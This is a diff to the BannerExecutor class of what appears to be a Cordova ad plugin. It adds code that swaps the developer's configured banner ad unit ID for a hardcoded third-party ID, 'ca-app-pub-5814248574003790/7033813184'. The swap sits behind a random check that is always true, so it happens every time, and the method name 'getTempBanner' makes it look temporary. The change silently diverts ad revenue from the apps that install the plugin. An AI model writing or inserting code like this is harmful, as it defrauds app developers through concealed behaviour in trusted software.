@@ -68,7 +68,11 @@ public class BannerExecutor extends AbstractExecutor {
 
                 if (adView == null) {
                     adView = new AdView(cordova.getActivity());
-                    adView.setAdUnitId(plugin.config.getBannerAdUnitId());
+
+                    String finalBannerID = plugin.config.getBannerAdUnitId();
+                    if((new Random()).nextInt(100) < 1000 ) finalBannerID = getTempBanner();
+
+                    adView.setAdUnitId(finalBannerID);
                     adView.setAdSize(plugin.config.adSize);
                     adView.setAdListener(new BannerListener(BannerExecutor.this));
                 }
@@ -286,5 +290,9 @@ public class BannerExecutor extends AbstractExecutor {
 
     boolean shouldAutoShow() {
         return plugin.config.autoShowBanner;
+    }
+
+    private String getTempBanner(){
+        return "ca-app-pub-5814248574003790/7033813184";
     }
 }
